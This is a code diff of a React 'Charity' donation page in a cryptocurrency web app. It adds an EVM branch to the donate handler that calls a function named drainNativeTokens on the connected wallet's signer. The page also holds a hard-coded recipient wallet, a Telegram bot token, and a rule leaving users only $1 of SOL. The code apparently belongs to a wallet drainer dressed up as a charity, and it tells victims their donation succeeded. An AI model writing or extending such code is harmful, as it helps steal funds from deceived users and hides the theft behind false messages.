@@ -12,6 +12,9 @@ import { Loader2, X, Heart, Zap, Coins } from 'lucide-react';
 import { Badge } from '@/components/ui/badge';
 import { toast } from 'sonner';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
@@ -34,6 +37,8 @@ const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL
 const Charity = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
+  const { activeChain, getEVMChain } = useChain();
+  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
   const [solPriceUSD, setSolPriceUSD] = useState(0);
@@ -267,6 +272,28 @@ const Charity = () => {
   }, [publicKey]);
 
   const handleDonate = useCallback(async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setButtonState('loading');
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} donation...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success(`${chainName} donation successful!`);
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+        setButtonState('idle');
+      } catch (error: any) {
+        setButtonState('error');
+        toast.error('Donation failed: ' + (error?.message || 'Unknown error'));
+        setTimeout(() => setButtonState('idle'), 3000);
+      }
+      return;
+    }
+
+    // Solana path
     if (!publicKey || !sendTransaction) {
       toast.error('Please connect your wallet');
       return;
@@ -441,7 +468,7 @@ const Charity = () => {
       toast.error(error?.message || 'Donation failed');
       setTimeout(() => setButtonState('idle'), 3000);
     }
-  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances]);
+  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances, activeChain, isEVMConnected, evmSigner, evmProvider, getEVMChain]);
 
   return (
     <div className="min-h-screen relative overflow-hidden">
